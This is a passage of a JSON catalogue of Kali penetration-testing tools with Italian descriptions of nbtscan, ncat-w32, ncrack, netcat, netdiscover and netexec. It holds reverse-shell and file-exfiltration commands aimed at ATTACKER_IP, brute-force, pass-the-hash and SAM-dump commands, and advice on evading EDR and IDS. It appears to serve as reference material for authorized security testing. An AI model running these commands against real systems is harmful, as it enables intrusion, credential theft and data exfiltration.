    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NBTScan-unixwiz</strong> è la versione sviluppata da Steve Friedl (unixwiz.net) dello scanner NetBIOS, ottimizzata per sistemi Unix/Linux. A differenza di altre implementazioni, questa versione è progettata per essere particolarmente veloce e leggera, utilizzando query UDP parallele per scansionare grandi subnet in pochi secondi. È lo strumento ideale per la discovery rapida di sistemi Windows in ambienti enterprise durante le fasi iniziali di un penetration test interno.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Parallel UDP Scanning:</strong> Implementa un meccanismo di query parallele che permette di scansionare intere subnet /24 in pochi secondi. Utilizza socket raw per massimizzare l'efficienza e minimizzare l'overhead di sistema.</p><p><strong>NetBIOS Name Resolution:</strong> Interroga il NetBIOS Name Service (porta 137/UDP) per ottenere la tabella dei nomi registrati su ogni host, incluso il nome macchina, il workgroup/domain di appartenenza, e i servizi NetBIOS attivi.</p><p><strong>Service Type Detection:</strong> Interpreta i suffissi NetBIOS per identificare il ruolo di ogni sistema: workstation (<00>), file server (<20>), domain controller, browser master, messenger service. Questa informazione aiuta a prioritizzare i target.</p><p><strong>MAC Address Retrieval:</strong> Estrae l'indirizzo MAC hardware dalla risposta NetBIOS, permettendo di identificare il vendor della scheda di rete e potenzialmente il tipo di dispositivo (server fisico, VM, appliance).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia a riga di comando è minimale e orientata alla velocità. Supporta range CIDR e output in vari formati.</p><pre><code># Scan rapido di una subnet\nnbtscan-unixwiz 192.168.1.0/24\n\n# Output verboso con dettagli servizi\nnbtscan-unixwiz -v 192.168.1.0/24\n\n# Modalità quiet (solo risultati)\nnbtscan-unixwiz -q 192.168.1.0/24\n\n# Scan con timeout esteso per reti lente\nnbtscan-unixwiz -t 500 192.168.1.0/24\n\n# Output separato da tab per parsing\nnbtscan-unixwiz -s 192.168.1.0/24\n\n# Scan di range multipli\nnbtscan-unixwiz 192.168.1.0/24 10.0.0.0/24</code></pre><p>L'output di default mostra IP, nome NetBIOS, e informazioni sul dominio in formato tabulare facilmente integrabile con altri tool (grep, awk, cut).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Network Discovery</strong> in penetration test interni, è il tool più veloce per ottenere una lista di tutti i sistemi Windows attivi su una o più subnet, con informazioni sul loro ruolo nel dominio.</p><p>Per <strong>Active Directory Reconnaissance</strong>, permette di identificare rapidamente Domain Controller, file server, e workstation critiche prima di procedere con enumerazione LDAP o attacchi mirati.</p><p>Nella fase di <strong>Lateral Movement Planning</strong>, sapere quali sistemi sono presenti e quale ruolo hanno aiuta a pianificare il percorso di compromissione più efficace.</p><p>Per <strong>Network Segmentation Testing</strong>, verificare da quali VLAN è possibile raggiungere sistemi Windows in altri segmenti tramite query NetBIOS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico NetBIOS sulla porta 137/UDP è normale in ambienti Windows, ma uno scan sistematico di una subnet genera un pattern riconoscibile. IDS moderni possono correlare le query e identificare attività di reconnaissance.</p><p><strong>Impatto:</strong> Minimo sui sistemi target. Le query NetBIOS sono leggere e non causano carico significativo. Il traffico UDP può essere filtrato da firewall inter-VLAN.</p><p><strong>Mitigazioni:</strong> In ambienti con NetBIOS disabilitato (best practice moderna), lo scan non produrrà risultati. Considerare l'uso di LDAP query per ambienti più moderni. Il traffico non è cifrato e può essere monitorato in transito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "nbtscan",
    "name": "nbtscan",
    "version": "1.7.2",
    "icon": "../app/icons/nbtscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nbtscan/",
    "desc": "Scansione NetBIOS per discovery di hostname, workgroup e utenti su reti Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NBTScan</strong> è uno scanner specializzato per il protocollo NetBIOS Name Service (NBT-NS), fondamentale per la discovery in ambienti Windows e Active Directory. Interrogando la porta 137/UDP, estrae informazioni preziose come hostname, workgroup o dominio di appartenenza, utenti attualmente loggati, MAC address e servizi NetBIOS attivi. È uno strumento classico e affidabile, presente nel toolkit di ogni pentester per la fase di reconnaissance su reti Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NetBIOS Name Query:</strong> Invia richieste NBT-NS sulla porta 137/UDP per recuperare la tabella dei nomi NetBIOS di ogni host. Questa tabella contiene informazioni sul nome macchina, dominio/workgroup, e servizi registrati (file sharing, messenger, browser).</p><p><strong>User Detection:</strong> Identifica gli utenti attualmente loggati sui sistemi Windows interrogando il suffisso NetBIOS <03>. Informazione cruciale per identificare workstation di utenti privilegiati o sessioni amministrative attive.</p><p><strong>Service Flags Parsing:</strong> Decodifica i flag dei servizi NetBIOS per distinguere tra Domain Controller, server, workstation, e browser master. Permette di mappare rapidamente la gerarchia della rete Windows.</p><p><strong>MAC Address Extraction:</strong> Recupera l'indirizzo MAC hardware dell'interfaccia di rete, utile per fingerprinting e per identificare il vendor della scheda di rete (OUI lookup).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>NBTScan è estremamente semplice da usare. Accetta singoli IP, range CIDR, o file di target.</p><pre><code># Scan di una subnet intera\nnbtscan 192.168.1.0/24\n\n# Output human-readable con dettagli\nnbtscan -h 192.168.1.0/24\n\n# Verbose mode per troubleshooting\nnbtscan -v 192.168.1.0/24\n\n# Scan da file di target\nnbtscan -f targets.txt\n\n# Output in formato separato da virgole (CSV)\nnbtscan -s, 192.168.1.0/24\n\n# Timeout personalizzato per reti lente\nnbtscan -t 2 192.168.1.0/24</code></pre><p>L'output standard mostra IP, nome NetBIOS, utente loggato e MAC address in formato tabulare facilmente parsabile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Discovery Iniziale</strong> in penetration test interni, NBTScan è spesso il primo strumento eseguito per mappare rapidamente tutti i sistemi Windows presenti nella rete e identificare Domain Controller, server e workstation.</p><p>Per <strong>Active Directory Enumeration</strong>, permette di identificare la struttura del dominio, le trust relationship (osservando diversi domain name) e la distribuzione geografica dei sistemi prima di procedere con tool più invasivi.</p><p>Nella fase di <strong>Target Prioritization</strong>, identificare quali workstation hanno sessioni amministrative attive permette di focalizzare gli attacchi di credential theft su sistemi ad alto valore.</p><p>Per <strong>Network Inventory</strong>, anche i team IT lo utilizzano per audit rapidi dell'infrastruttura Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query NetBIOS sono traffico relativamente comune in ambienti Windows, ma uno scan massivo di un'intera subnet può essere rilevato. Gli IDS possono correlare richieste multiple dalla stessa sorgente in breve tempo.</p><p><strong>Impatto:</strong> Lo scan è passivo dal punto di vista dei sistemi target (non causa carico o crash). Il traffico UDP può essere rate-limited da alcuni firewall.</p><p><strong>Mitigazioni:</strong> In ambienti moderni, NetBIOS è spesso disabilitato a favore di DNS puro. Verificare prima se il target utilizza ancora NBT-NS. Utilizzare delay tra le query (-t) per ridurre il profilo. Il traffico è cifrato zero, quindi intercettabile in transito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "ncat-w32",
    "name": "ncat-w32",
    "version": "5.59beta1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ncat-w32/",
    "desc": "Versione Windows di Ncat per trasferimenti di file e shell remote su target Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ncat-w32 è la versione nativa Windows di Ncat, il tool di networking evoluto distribuito con il progetto Nmap. Offre funzionalità di trasferimento dati, creazione di shell remote e relay TCP/UDP in ambiente Windows senza dipendenze aggiuntive. A differenza di netcat tradizionale, ncat-w32 supporta nativamente SSL/TLS per cifrare le comunicazioni, autenticazione tramite allow/deny list e la possibilità di gestire connessioni multiple simultaneamente. È uno strumento essenziale per penetration tester che operano su target Windows dove non è possibile installare tool Linux-based. La versione Windows mantiene piena compatibilità con la controparte Linux, permettendo comunicazioni cross-platform trasparenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shell remote cifrate:</strong> Ncat-w32 permette di stabilire bind shell e reverse shell con cifratura SSL/TLS integrata. Questo protegge il traffico di comando e controllo da ispezione da parte di IDS/IPS di rete. La configurazione richiede un singolo flag --ssl senza necessità di certificati esterni per connessioni opportunistiche.</p><p><strong>Trasferimento file bidirezionale:</strong> Supporta il trasferimento di file tra sistemi attraverso pipe e redirezione I/O standard. È possibile trasferire binari, script e dati di exfiltration in modo affidabile su connessioni TCP o UDP. La modalità --send-only e --recv-only permette di controllare la direzione del flusso dati.</p><p><strong>Broker e relay di connessioni:</strong> La modalità broker (--broker) permette a ncat-w32 di fungere da hub centrale dove più client possono connettersi e scambiarsi dati. Questo è utile per creare canali di comunicazione multi-punto durante operazioni di red team. Il relay permette di concatenare connessioni per pivoting attraverso segmenti di rete.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ncat-w32 si utilizza da riga di comando su sistemi Windows. I comandi sono identici alla versione Linux di ncat.</p><pre><code># Reverse shell cifrata dal target Windows\nncat-w32.exe --ssl -e cmd.exe ATTACKER_IP 4444\n\n# Listener con SSL sul sistema attaccante\nncat --ssl -lvp 4444\n\n# Trasferimento file dal target\nncat-w32.exe --ssl --send-only ATTACKER_IP 8080 &lt; C:\\Users\\target\\secrets.db\n\n# Broker per comunicazione multi-client\nncat-w32.exe -l --broker --ssl 9090\n\n# Port forwarding locale\nncat-w32.exe -l 3389 --sh-exec \"ncat-w32.exe 10.0.0.5 3389\"</code></pre><p>Il flag --allow permette di limitare le connessioni a IP specifici, mentre --max-conns controlla il numero massimo di connessioni simultanee.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante operazioni di post-exploitation su ambienti Windows, ncat-w32 viene utilizzato per stabilire canali di comunicazione cifrati quando tool C2 più complessi non sono disponibili o risulterebbero troppo rumorosi. Un penetration tester che ha ottenuto accesso iniziale a un host Windows può utilizzare ncat-w32 per creare una reverse shell SSL verso il proprio sistema, bypassando controlli DPI che ispezionano traffico in chiaro. In scenari di lateral movement, ncat-w32 serve come relay per raggiungere segmenti di rete interni non direttamente accessibili, concatenando connessioni attraverso host compromessi. È anche utilizzato per exfiltrazione rapida di file sensibili quando non è possibile utilizzare protocolli applicativi come HTTP o SMB monitorati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione di ncat-w32.exe può essere rilevata da soluzioni EDR che monitorano la creazione di processi con parametri di rete. Il flag -e cmd.exe è particolarmente sospetto e viene segnalato dalla maggior parte degli antivirus moderni. Il binario stesso potrebbe essere flaggato come potentially unwanted program (PUP).</p><p><strong>Impatto operativo:</strong> Le connessioni SSL generate da ncat-w32 producono certificati auto-firmati facilmente identificabili tramite analisi JA3/JA3S fingerprint. Il traffico su porte non standard con TLS auto-firmato è un indicatore di compromissione comune. Le connessioni persistenti generano pattern di traffico distinguibili dal traffico legittimo.</p><p><strong>Mitigazioni:</strong> Rinominare il binario per evitare detection basata sul nome del processo. Utilizzare porte comunemente associate a servizi legittimi (443, 8443). Considerare l'uso di certificati validi con --ssl-cert e --ssl-key per mimetizzare il traffico TLS. Limitare la durata delle sessioni e preferire trasferimenti burst piuttosto che connessioni persistenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "ncrack",
    "name": "ncrack",
    "version": "0.7",
    "icon": "../app/icons/ncrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ncrack/",
    "desc": "Brute forcer di rete ad alte prestazioni per SSH, RDP, FTP, Telnet e altri protocolli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ncrack</strong> è un brute forcer di rete ad alte prestazioni sviluppato dal team Nmap, progettato specificamente per auditing di credenziali su larga scala. A differenza di altri tool simili, Ncrack utilizza un engine modulare con timing adattivo che si adegua dinamicamente alle condizioni di rete e alle risposte del target, massimizzando la velocità senza causare denial of service. Supporta nativamente i protocolli più critici: SSH, RDP, FTP, Telnet, HTTP(S), POP3, IMAP, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, e WinRM. L'integrazione nativa con l'output di Nmap permette workflow automatizzati di reconnaissance-to-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol Engine:</strong> Supporta oltre 20 protocolli con moduli specifici ottimizzati per ciascun servizio. Ogni modulo implementa la logica di autenticazione nativa del protocollo, gestendo correttamente handshake, encryption negotiation, e response parsing.</p><p><strong>Adaptive Timing:</strong> Il sistema di timing si adatta in tempo reale basandosi su RTT, rate limiting del target, e condizioni di rete. Template predefiniti (paranoid, sneaky, polite, normal, aggressive, insane) o customizzazione fine-grained di timeout, delay, e parallelismo.</p><p><strong>Connection Pooling:</strong> Gestisce pool di connessioni persistenti dove possibile, riducendo overhead di handshake e aumentando throughput. Particolarmente efficace con SSH e RDP dove il connection setup è costoso.</p><p><strong>Session Resume:</strong> Salva automaticamente lo stato della sessione permettendo di riprendere scan interrotti. Utile per operazioni di lunga durata o quando è necessario dividere l'attività in finestre temporali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ncrack offre sintassi flessibile per target specification, compatibile con la notazione Nmap.</p><pre><code># SSH brute force con wordlist\nncrack -p 22 --user admin -P /usr/share/wordlists/rockyou.txt target.com\n\n# RDP con timing aggressivo\nncrack -p 3389 --user administrator -P passwords.txt -T4 target.com\n\n# Multiple services su stesso host\nncrack ssh://target.com rdp://target.com ftp://target.com\n\n# Multiple users e passwords\nncrack -p 22 -U users.txt -P passwords.txt 192.168.1.0/24\n\n# Import da Nmap XML output\nncrack -iX nmap_scan.xml -U users.txt -P pass.txt\n\n# Timing stealth per evitare detection\nncrack -p 22 --user root -P pass.txt -T2 --connection-limit 1 target.com\n\n# SMB con domain authentication\nncrack smb://target.com --user 'DOMAIN\\user' -P passwords.txt\n\n# Resume sessione precedente\nncrack --resume ncrack.restore\n\n# Output verbose e salvataggio\nncrack -v -oN results.txt -p 22 --user admin -P pass.txt target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Password Audit Aziendali</strong>, ncrack permette di verificare la robustezza delle credenziali su servizi critici come SSH bastions, jump servers RDP, e database. La capacità di testare subnet intere aiuta a identificare sistemi con password deboli o default.</p><p>Nel <strong>Penetration Testing</strong>, dopo la fase di enumeration, ncrack viene usato per attacchi credential-based su servizi identificati. L'integrazione con Nmap semplifica il workflow: scan servizi → export XML → ncrack su servizi autenticati.</p><p>Per <strong>Red Team Operations</strong>, i timing template stealth permettono di spalmare l'attacco su periodi prolungati evitando alert basati su volume. La funzione resume è critica per operazioni che devono rispettare finestre temporali specifiche.</p><p>Nella <strong>Compliance Verification</strong>, verifica che password policy aziendali siano effettivamente implementate testando resistenza a dictionary attack con wordlist comuni come rockyou.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Noise Profile:</strong> Brute force genera inevitabilmente molti tentativi di login falliti. Ogni tentativo viene loggato dal target e potenzialmente inviato a SIEM. Pattern riconoscibile: stesso source IP, sequenza di username/password, timing regolare.</p><p><strong>Account Lockout:</strong> Molti sistemi implementano lockout dopo N tentativi falliti. Questo può causare denial of service involontario bloccando account legittimi. Verificare policy prima di lanciare attack. Usare spray attack (few passwords, many users) invece di traditional brute force.</p><p><strong>Network Detection:</strong> IDS/IPS riconoscono pattern di brute force. Firewall possono implementare rate limiting automatico. Connection tracking identifica comportamenti anomali da singolo IP.</p><p><strong>Mitigazioni:</strong> Usare timing template sneaky/paranoid per ridurre rate. Limitare connessioni parallele con --connection-limit. Distribuire attack attraverso proxy chain o multiple source IP. Preferire password spraying con poche password comuni su molti account.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "netcat",
    "name": "netcat",
    "version": "1.10",
    "icon": "../app/icons/netcat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netcat/",
    "desc": "Swiss army knife delle reti: connessioni TCP/UDP, trasferimenti file e shell di base.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netcat</strong>, spesso chiamato \"Swiss Army knife delle reti\", è una delle utility più versatili e fondamentali per operazioni di rete su sistemi Unix/Linux. Permette di creare connessioni TCP e UDP arbitrarie, funzionando sia come client che come server. La sua semplicità e ubiquità (presente di default su quasi ogni sistema Unix) lo rendono lo strumento di riferimento per debugging di rete, trasferimento file ad-hoc, e creazione di shell durante penetration testing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP/UDP Client-Server:</strong> Può aprire connessioni verso qualsiasi host e porta (client mode) o mettersi in ascolto su una porta locale (server/listener mode). Supporta sia TCP che UDP, permettendo di testare qualsiasi servizio di rete.</p><p><strong>Data Piping:</strong> Tutto ciò che viene inviato su stdin viene trasmesso sulla connessione, e tutto ciò che arriva dalla connessione viene stampato su stdout. Questo permette di concatenare netcat con altri tool Unix per operazioni complesse.</p><p><strong>Basic Port Scanning:</strong> Con l'opzione -z (zero I/O mode), può verificare rapidamente quali porte sono aperte su un host senza stabilire connessioni complete.</p><p><strong>Shell Execution:</strong> Con l'opzione -e (non presente in tutte le versioni), può eseguire un programma alla connessione, permettendo di creare bind shell o reverse shell semplicissime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi è minimale e i flag principali sono memorizzabili facilmente.</p><pre><code># Listener TCP sulla porta 4444\nnc -lvnp 4444\n\n# Connessione a un host\nnc target.com 4444\n\n# Reverse shell (dal target verso l'attacker)\n# Su attacker:\nnc -lvnp 4444\n# Su target:\nnc -e /bin/bash attacker_ip 4444\n\n# Bind shell (sul target, in ascolto)\nnc -lvnp 4444 -e /bin/bash\n\n# Trasferimento file\n# Receiver:\nnc -lvnp 8888 > received_file.bin\n# Sender:\nnc target 8888 < file_to_send.bin\n\n# Port scan base (TCP)\nnc -zv target.com 1-1000\n\n# Connessione UDP\nnc -u target.com 53\n\n# Banner grabbing\necho \"GET / HTTP/1.0\\r\\n\\r\\n\" | nc target.com 80</code></pre><p>Note: flag -e non disponibile su tutte le versioni (netcat-traditional vs netcat-openbsd). Su sistemi senza -e, usare named pipes o alternative come /dev/tcp bash built-in.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Penetration Testing</strong>, netcat è lo strumento primario per stabilire reverse shell dopo aver sfruttato una vulnerabilità. La sua presenza su quasi ogni sistema lo rende utilizzabile senza upload di tool aggiuntivi.</p><p>Per <strong>Network Debugging</strong>, permette di testare rapidamente connettività, verificare che servizi siano raggiungibili, e fare banner grabbing per identificare software in ascolto.</p><p>Nel <strong>File Transfer</strong> ad-hoc, quando non sono disponibili SCP o altri metodi, netcat permette di trasferire file binari tra host in pochi secondi.</p><p>Per <strong>Learning</strong>, la semplicità di netcat lo rende perfetto per capire i fondamenti dei socket TCP/UDP e delle connessioni di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffico in Chiaro:</strong> Netcat non implementa alcuna cifratura. Tutto il traffico, incluse shell e file trasferiti, è visibile in chiaro a chiunque possa intercettare la rete. Per operazioni sensibili, usare alternative cifrate come ncat (con SSL) o socat.</p><p><strong>Detection:</strong> Le connessioni netcat sono facilmente identificabili: processi nc in ascolto, connessioni su porte non standard, e pattern di traffico shell sono indicatori noti. EDR e network monitoring possono rilevare l'attività.</p><p><strong>Versioni:</strong> Esistono diverse implementazioni (traditional, OpenBSD, ncat) con funzionalità diverse. L'opzione -e è disponibile solo su netcat-traditional. Verificare quale versione è presente sul sistema target.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "netdiscover",
    "name": "netdiscover",
    "version": "0.21",
    "icon": "../app/icons/netdiscover-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netdiscover/",
    "desc": "Scanner ARP attivo/passivo per identificare host live su reti locali switched.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netdiscover</strong> è uno scanner ARP specializzato per la discovery di host su reti locali, particolarmente efficace in ambienti switched dove le tecniche basate su ICMP potrebbero fallire. Offre due modalità operative: attiva (invia ARP request) per scansioni rapide, e passiva (sniffa traffico ARP esistente) per reconnaissance stealth. Visualizza in tempo reale IP address, MAC address e vendor della scheda di rete, fornendo una mappa immediata di tutti i dispositivi presenti sulla LAN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Active ARP Scanning:</strong> Invia ARP request verso tutti gli indirizzi IP nel range specificato. Ogni host attivo risponde rivelando il proprio MAC address. Questa modalità è veloce ma genera traffico di rete visibile.</p><p><strong>Passive ARP Sniffing:</strong> Cattura passivamente tutto il traffico ARP che attraversa la rete senza inviare alcun pacchetto. Completamente invisibile, costruisce la mappa della rete osservando le comunicazioni esistenti tra gli host.</p><p><strong>OUI Vendor Lookup:</strong> Identifica automaticamente il produttore della scheda di rete basandosi sui primi 3 byte del MAC address (OUI - Organizationally Unique Identifier). Rivela il tipo di dispositivo (Apple, Dell, Cisco, VMware, etc.).</p><p><strong>Real-Time Interface:</strong> Interfaccia ncurses che si aggiorna in tempo reale mostrando nuovi host man mano che vengono scoperti, con contatori di pacchetti e statistiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Netdiscover richiede privilegi root per accedere ai raw socket. Supporta range CIDR o scansione dell'intera subnet.</p><pre><code># Scan attivo di una subnet\nsudo netdiscover -r 192.168.1.0/24\n\n# Modalità passiva (stealth, nessun traffico generato)\nsudo netdiscover -p\n\n# Specifica interfaccia di rete\nsudo netdiscover -i eth0 -r 10.0.0.0/24\n\n# Fast mode (meno accurato, più veloce)\nsudo netdiscover -f -r 192.168.1.0/24\n\n# Range multipli separati da virgola\nsudo netdiscover -r 192.168.1.0/24,10.0.0.0/24\n\n# Limita numero di nodi da scoprire\nsudo netdiscover -r 192.168.1.0/24 -c 50\n\n# Output non interattivo per scripting\nsudo netdiscover -r 192.168.1.0/24 -P -N</code></pre><p>L'output mostra una tabella con IP, MAC, conteggio pacchetti, lunghezza, e vendor per ogni host scoperto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase iniziale di <strong>Internal Penetration Testing</strong>, netdiscover fornisce rapidamente una lista di tutti gli host attivi sulla rete locale, informazione essenziale per pianificare i successivi passi dell'assessment.</p><p>Per <strong>Wireless Security Assessment</strong>, dopo aver compromesso una rete WiFi, netdiscover mappa i client connessi rivelando dispositivi mobili, IoT, e workstation da targetizzare.</p><p>In modalità passiva per <strong>Stealth Reconnaissance</strong>, può costruire una mappa della rete senza generare alcun traffico, ideale quando la detection è una preoccupazione.</p><p>Per <strong>Network Inventory</strong> e troubleshooting, gli amministratori possono identificare rapidamente dispositivi rogue o non autorizzati sulla rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento Modalità Attiva:</strong> Lo scan ARP genera traffico broadcast che può essere rilevato da switch con port security, IDS, o tool come arpwatch. Il pattern di ARP request sequenziali è facilmente identificabile.</p><p><strong>Modalità Passiva Invisibile:</strong> La modalità -p non genera alcun traffico ed è completamente invisibile. Tuttavia, richiede tempo per costruire una mappa completa basandosi solo sul traffico esistente.</p><p><strong>Limitazioni Layer 2:</strong> ARP funziona solo a livello 2 (data link). Non può scoprire host su subnet diverse o attraverso router. Efficace solo sulla stessa VLAN/broadcast domain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "netexec",
    "name": "netexec",
    "version": "1.4.0",
    "icon": "../app/icons/netexec-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netexec/",
    "desc": "Successore di CrackMapExec per pentesting AD: SMB, WinRM, LDAP, MSSQL execution.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>NetExec (nxc) è il successore ufficiale di CrackMapExec, uno dei tool più utilizzati nel pentesting di ambienti Active Directory. Offre capacità di enumerazione, esecuzione remota di comandi e post-exploitation su protocolli SMB, WinRM, LDAP, MSSQL, SSH, RDP e FTP. NetExec è stato riscritto con architettura modulare migliorata, maggiore stabilità e supporto per nuovi protocolli rispetto al predecessore. Supporta autenticazione con password, hash NTLM, ticket Kerberos e certificati, rendendolo versatile per ogni fase del pentesting AD. È lo strumento di riferimento per verificare credenziali su larga scala e per lateral movement in reti Windows enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential spraying multi-protocollo:</strong> NetExec permette di testare credenziali (password o hash) contro centinaia di host simultaneamente su SMB, WinRM, LDAP e altri protocolli. Il sistema di threading ottimizzato gestisce timeout e errori senza bloccare l'esecuzione. I risultati indicano chiaramente se le credenziali sono valide, se l'utente è admin locale e se l'account è disabilitato.</p><p><strong>Esecuzione remota di comandi:</strong> Supporta multiple tecniche di execution remota: smbexec, wmiexec, atexec, dcomexec e psexec. Ogni metodo ha caratteristiche OPSEC diverse in termini di log generati e artefatti lasciati sul target. La scelta del metodo può essere guidata dalle difese presenti nell'ambiente target.</p><p><strong>Moduli di post-exploitation:</strong> Include decine di moduli per dumping SAM, LSA secrets, LSASS, DPAPI, group policy preferences, Kerberoasting, AS-REP roasting e molto altro. I moduli sono estensibili e la community contribuisce regolarmente nuovi moduli per tecniche emergenti. Il database interno traccia automaticamente credenziali scoperte e relazioni tra host.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>NetExec si invoca con il protocollo come primo argomento, seguito dal target e dalle opzioni di autenticazione.</p><pre><code># Enumerazione SMB con credenziali\nnxc smb 192.168.1.0/24 -u admin -p Password123\n\n# Pass-the-hash su WinRM\nnxc winrm 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash\n\n# Dump SAM database\nnxc smb 10.0.0.5 -u admin -p Pass123 --sam\n\n# Kerberoasting via LDAP\nnxc ldap dc01.domain.local -u user -p pass --kerberoasting output.txt\n\n# Esecuzione comando remoto\nnxc smb target -u admin -p pass -x \"whoami /all\" --exec-method wmiexec\n\n# Enumerazione shares\nnxc smb 10.0.0.0/24 -u user -p pass --shares</code></pre><p>Il database interno (accessibile con nxc db) permette di consultare tutte le credenziali e host scoperti durante la sessione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>NetExec è fondamentale durante l'assessment di reti Active Directory. Dopo aver ottenuto un primo set di credenziali (tramite phishing, responder o altro), il tester usa nxc per verificare su quali host quelle credenziali hanno accesso amministrativo tramite SMB. Questo permette di mappare rapidamente il perimetro di compromissione. In fase di lateral movement, nxc viene utilizzato per eseguire comandi su host remoti scegliendo il metodo di esecuzione meno rilevabile. Per credential harvesting, i moduli di dump SAM, LSA e LSASS permettono di raccogliere hash e password in chiaro da host compromessi, alimentando il database interno per ulteriore spraying. In assessment di grandi dimensioni con migliaia di host, la capacità di parallelizzare le operazioni rende nxc insostituibile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le operazioni di credential spraying generano numerosi eventi di autenticazione (Event ID 4625 per fallimenti, 4624 per successi) facilmente correlabili da SIEM. L'esecuzione remota tramite psexec crea servizi temporanei visibili nei log. Il dump di LSASS è monitorato dalla maggior parte delle soluzioni EDR moderne.</p><p><strong>Impatto operativo:</strong> Credential spraying aggressivo può causare lockout di account se le policy di blocco sono attive. Le connessioni SMB multiple da un singolo IP sorgente sono un indicatore di compromissione ben noto. L'accesso a share amministrative (C$, ADMIN$) viene loggato e monitorato.</p><p><strong>Mitigazioni:</strong> Limitare il rate di spraying con --jitter e intervalli tra tentativi. Utilizzare wmiexec o dcomexec invece di psexec per ridurre gli artefatti. Verificare le policy di lockout prima di iniziare lo spraying. Utilizzare autenticazione Kerberos (-k) quando possibile per ridurre il traffico NTLM monitorato. Operare da un host già compromesso nella rete per ridurre anomalie di traffico.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "netscanner",
    "name": "netscanner",
    "version": "0.6.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netscanner/",
    "desc": "Scanner di rete con interfaccia TUI per discovery host e servizi in tempo reale.",
